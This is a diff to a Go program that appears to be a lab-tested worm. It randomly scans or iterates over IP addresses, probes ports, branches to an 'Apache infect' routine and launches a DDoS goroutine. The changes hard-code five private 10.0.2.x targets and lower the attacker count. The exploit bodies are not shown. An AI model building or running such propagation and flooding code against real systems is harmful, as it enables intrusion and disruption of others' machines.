@@ -12,13 +12,24 @@ import (
 
 func attack(wg *sync.WaitGroup, id int, baseIp [4]int) {
 	attackerString := fmt.Sprintf("Attacker %d: ",id)
-	it := 2
+	//it := 2
 	var ip string
 	var ports [3]int
+	var ipList [5]string
+	
+	ipList[0] = "10.0.2.11"
+	ipList[1] = "10.0.2.12"
+	ipList[2] = "10.0.2.13"
+	ipList[3] = "10.0.2.14"
+	ipList[4] = "10.0.2.15"
+
+	it := 5
 	for i := 0; i < it; i++ {
 		ip = scan.GetRandomIp(baseIp)
+		ip = ipList[i]
 		fmt.Println(attackerString + ip)
 		ports = scan.ScanIp(ip)
+		fmt.Println(ports)
 		infected := false
 		//Apache infect
 		if ports[0] != 0 {
@@ -65,7 +76,7 @@ func main() {
 	var wg sync.WaitGroup
 	wg.Add(1)
 	go ddos.Hello(&wg,"test")
-	nAttackers := 2
+	nAttackers := 1
 	baseIp := [2][4]int{{10,0,2,-1},{10,0,1,-1}}
 	for i := 0; i < nAttackers; i++ {
 		wg.Add(1)
